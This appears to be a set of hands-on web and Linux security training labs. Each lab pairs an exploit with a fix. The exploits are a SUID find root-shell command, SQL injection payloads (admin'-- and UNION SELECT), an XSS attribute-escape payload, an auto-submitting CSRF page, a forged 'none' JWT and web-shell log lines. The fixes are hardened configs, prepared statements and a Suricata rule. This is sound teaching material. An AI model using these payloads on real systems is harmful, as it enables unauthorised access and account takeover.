LAB 01

HTTP Security Headers Hardening

Category: Defensive Web Security & Browser Protections
Difficulty: Beginner Est: 15 mins
Objective:

Identify missing defense-in-depth headers on an unhardened banking API response and construct a compliant Nginx configuration block.

Scenario:

AcmeFintech's staging environment at https://staging.acmefin.local returns no CSP, allows framing by third parties, and accepts unencrypted HTTP downgrades.

Simulated Server Response Headers: 
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.3
Set-Cookie: session_id=abc12345; Path=/
task Task: Audit the 4 missing critical headers and cookie flags.
Hint 1: If the site is framed in an iframe, what header prevents Clickjacking? Look into X-Frame-Options or CSP frame-ancestors.
Hint 2: Notice the session_id cookie is missing HttpOnly, Secure, and SameSite=Strict flags.
Official Walkthrough & Solution:

The response leaks underlying server version banners (Server, X-Powered-By) assisting attacker enumeration. It lacks Strict-Transport-Security (allowing SSL stripping), X-Frame-Options: DENY (permitting Clickjacking), X-Content-Type-Options: nosniff (permitting MIME confusion), and Content-Security-Policy.

Hardened Nginx Configuration: 
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none';" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
server_tokens off;
LAB 02

Linux Permissions & Octal Masking

Category: System Administration & Access Controls
Difficulty: Beginner Est: 15 mins
Objective:

Calculate octal notation permissions and identify the security hazard in a world-writable configuration file.

Scenario:

A junior administrator ran a script to fix permission issues on a database credentials file located at /var/www/html/config.php.

ls -l Output: 
-rwxrwxrwx 1 www-data www-data 1024 Oct 04 09:00 config.php
Hint: rwxrwxrwx equals octal 777. Any unprivileged local user (guest, mail, ftp) can overwrite database passwords or inject PHP backdoors.
Solution & Hardening:

Octal 777 allows any user on the machine to modify or delete the file. For sensitive configuration files, permissions must be restricted to 600 (read/write owner only) or 640 (read group only). 

sudo chown www-data:www-data /var/www/html/config.php
sudo chmod 600 /var/www/html/config.php
LAB 03

SUID Binary Privilege Escalation

Category: Offensive Linux & Local Privilege Escalation
Difficulty: Intermediate Est: 25 mins
Objective:

Analyze the output of a SUID audit command and exploit a misconfigured standard binary to spawn a root shell.

Scenario:

You have obtained an unprivileged shell as user guest on a simulated Linux lab server. The admin set SUID on several utilities for convenience.

find / -perm -4000 -type f 2>/dev/null Results: 
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/find    <-- Unusual SUID binary
/usr/bin/newgrp
Hint: Check GTFOBins for find. The -exec flag can invoke /bin/sh -p to preserve effective root permissions.
Exploit Command & Defense: 
/usr/bin/find . -exec /bin/sh -p \; -quit

Because find carries SUID root, executing /bin/sh -p preserves the effective UID (euid=0).

Defensive Hardening: 
sudo chmod u-s /usr/bin/find
LAB 04

Authentication Logic Flaw & SQLi Bypass

Category: Web Application Authentication
Difficulty: Beginner Est: 20 mins
Vulnerable Backend Code (PHP): 
$username = $_POST['user'];
$password = $_POST['pass'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    $_SESSION['auth'] = true;
    $_SESSION['user'] = $username;
}
Hint: If username is set to admin'--, what happens to the password check condition in the SQL statement?
Exploit Input & Defense:

Injecting admin'-- truncates the query to SELECT * FROM users WHERE username = 'admin', logging in as admin without knowing the password.

Defensive Prepared Statement (PDO): 
$stmt = $pdo->prepare('SELECT id, password_hash FROM users WHERE username = :user');
$stmt->execute(['user' => $username]);
$user = $stmt->fetch();
if ($user && password_verify($password, $user['password_hash'])) {
    // Validated login
}
LAB 05

Insecure Direct Object Reference (IDOR)

Category: Broken Object-Level Authorization (BOLA)
Difficulty: Intermediate Est: 20 mins
API Endpoint Scenario: 
GET /api/v1/invoices/9482 HTTP/1.1
Host: api.targetfin.local
Authorization: Bearer eyJhbGciOi... (Logged in as User 410)

Response:
{ "invoice_id": 9482, "owner_id": 410, "amount": "$450.00", "details": "Consulting" }
Hint: What happens if the authenticated user changes the URL path to /api/v1/invoices/9481? Does the server check if owner_id === session.userId?
Remediation Blueprint:

The server blindly fetched the invoice by ID from the database without checking if the requesting user's identity matches the invoice owner.

// Hardened Node.js Express route
app.get('/api/v1/invoices/:id', authMiddleware, async (req, res) => {
  const invoice = await db.Invoices.findOne({
    where: { id: req.params.id, owner_id: req.user.id } // Enforces ownership
  });
  if (!invoice) return res.status(404).json({ error: "Invoice not found or unauthorized" });
  res.json(invoice);
});
LAB 06

UNION-Based SQL Injection

Category: Server-Side Database Injection
Difficulty: Intermediate Est: 30 mins
Target URI: 
http://target.local/catalog.php?category=1' UNION SELECT 1,username,password FROM users-- -
SQL Injection Fundamentals:

The UNION SELECT operator merges attacker-controlled query results with the original catalog display. To succeed, the injected SELECT statement must have the exact same number of columns and compatible datatypes as the original query.

Defensive Rule:

Always use parameterized queries. Never concatenate variables into SQL strings.

LAB 07

Reflected XSS & Context Escaping

Category: Client-Side Code Injection
Difficulty: Beginner Est: 20 mins
Vulnerable HTML Context: 
<input type="text" name="search" value="USER_INPUT_REFLECTED_HERE">
Exploit Payload: 
" onfocus="alert(document.domain)" autofocus="

Because input reflects within an HTML attribute, simply injecting <script> might fail if brackets are sanitized. Escaping the attribute context via double quotes (") triggers event handlers cleanly.

Defensive Rule:

Apply context-aware attribute encoding (e.g. &quot;) and deploy strict Content-Security-Policy.

LAB 08

Cross-Site Request Forgery (CSRF) & SameSite

Category: Cross-Origin Session Exploitation
Difficulty: Intermediate Est: 25 mins
Attacker PoC Web Page: 
<form action="https://bank.target.local/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('csrfForm').submit();</script>
Remediation:

The bank accepted the state-changing POST request because the victim's browser automatically transmitted session cookies. Defense requires Cryptographically random Synchronizer Anti-CSRF tokens and setting cookies to SameSite=Strict.

Web Access Log Forensics

Category: Defensive Telemetry & Threat Detection
Difficulty: Intermediate Est: 25 mins
Apache Access Log Sample: 
192.168.1.105 - - [04/Oct/2026:08:12:01] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 2410 "-" "curl/7.81.0"
192.168.1.105 - - [04/Oct/2026:08:12:45] "POST /upload.php HTTP/1.1" 200 152 "-" "Mozilla/5.0"
192.168.1.105 - - [04/Oct/2026:08:13:02] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 45 "-" "curl/7.81.0"
Incident Response Analysis:

The attacker performed Path Traversal on /index.php, then uploaded an unvalidated PHP web shell via /upload.php, and executed arbitrary commands (cmd=whoami).

Detection Rule (Suricata): 
alert http any any -> any any (msg:"Path Traversal Attempt"; content:"/etc/passwd"; sid:1000002; rev:1;)
LAB 11

JWT "None" Algorithm Exploitation

Category: Cryptographic Token Flaws
Difficulty: Intermediate Est: 20 mins
Decoded Header & Payload: 
Header:  {"alg": "none", "typ": "JWT"}
Payload: {"user": "admin", "role": "superadmin", "exp": 1999999999}
Signature: (Empty)
Defensive Remediation:

Never accept none algorithm. Enforce specific expected algorithms (e.g. algorithms: ['RS256']) in JWT verification libraries.

XOR & Frequency Analysis Decryption

Category: Practical Cryptanalysis
Difficulty: Beginner Est: 20 mins
Ciphertext (Hex): 
1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736
Cryptanalysis Walkthrough:

Single-byte XOR ciphers can be cracked by brute-forcing all 256 possible byte values and scoring outputs based on English letter frequency (ETAOIN SHRDLU). The decrypted message reveals: "Cooking MC's like a pound of bacon" with key byte 0x58 ('X').
